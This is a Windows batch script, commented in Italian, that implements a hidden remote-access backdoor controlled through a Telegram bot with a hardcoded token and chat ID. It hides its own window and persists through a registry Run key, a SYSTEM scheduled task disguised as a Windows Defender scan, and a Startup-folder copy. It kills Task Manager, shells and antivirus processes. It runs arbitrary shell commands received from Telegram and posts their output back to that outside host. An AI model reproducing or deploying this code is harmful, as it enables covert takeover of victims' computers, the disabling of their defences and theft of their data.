@echo off & setlocal enableextensions enabledelayedexpansion

::: === INIZIALIZZAZIONE INVISIBILE === :::
if "%~1"=="--ghost" goto :ghost_mode

::: **Tecnica di occultamento avanzata (nessuna traccia)**
echo Set obj = CreateObject("WScript.Shell"): obj.Run "%~f0 --ghost", 0, False > "%TEMP%\~syscheck.vbs"
wscript.exe "%TEMP%\~syscheck.vbs" & del "%TEMP%\~syscheck.vbs" >nul 2>&1
exit /b

::: === MODALITÀ OPERATIVA FANTASMA === :::
:ghost_mode
set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
set "CHAT_ID=5709299213"
set "API_URL=https://api.telegram.org/bot%BOT_TOKEN%"

::: **PERSISTENZA AVANZATA (Registro, Task Scheduler, Startup)**
(
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefenderHelper" /t REG_SZ /d "\"%~f0\" --ghost" /f >nul 2>&1
    schtasks /create /tn "Microsoft\Windows Defender\MP Scheduled Scan" /tr "\"%~f0\" --ghost" /sc onstart /ru SYSTEM /f >nul 2>&1
    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\TrustedInstaller.bat" >nul 2>&1
)

::: **KILL PROCESSI IN MODO SILENZIOSO (Task Manager, CMD, PowerShell, AV)**
for %%p in (
    "taskmgr.exe" "cmd.exe" "powershell.exe" "wscript.exe" "cscript.exe"
    "procexp.exe" "procexp64.exe" "procmon.exe" "msmpeng.exe" "mbam.exe"
) do (
    taskkill /f /im %%p >nul 2>&1
    if errorlevel 1 (
        powershell -nop -c "Stop-Process -Name '%%~np' -Force -ErrorAction SilentlyContinue" >nul 2>&1
    )
)

::: **CONNESSIONE LAMPIEGO (WebSocket-like, nessun ritardo)**
:fast_loop
(
    for /f "delims=" %%A in ('powershell -nop -c "$r=try{irm '!API_URL!/getUpdates?offset=-1' -UseBasicParsing|ConvertFrom-Json}catch{};$r.result[-1].message.text"') do (
        set "COMMAND=%%A"
    )

    if defined COMMAND (
        if "!COMMAND!"=="killall" (
            powershell -nop -c "gps | ? {$_.Name -notmatch 'svchost|lsass|wininit|csrss'} | Stop-Process -Force" >nul 2>&1
        )
        if "!COMMAND:~0,6!"=="shell:" (
            set "CMD=!COMMAND:~6!"
            for /f "delims=" %%B in ('cmd /c "!CMD!" 2^>^&1') do (
                curl -s -X POST "!API_URL!/sendMessage?chat_id=%CHAT_ID%&text=%%B" >nul 2>&1
            )
        )
        if "!COMMAND!"=="selfdestruct" (
            reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefenderHelper" /f >nul 2>&1
            schtasks /delete /tn "Microsoft\Windows Defender\MP Scheduled Scan" /f >nul 2>&1
            del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\TrustedInstaller.bat" >nul 2>&1
            exit
        )
    )
) & goto :fast_loop
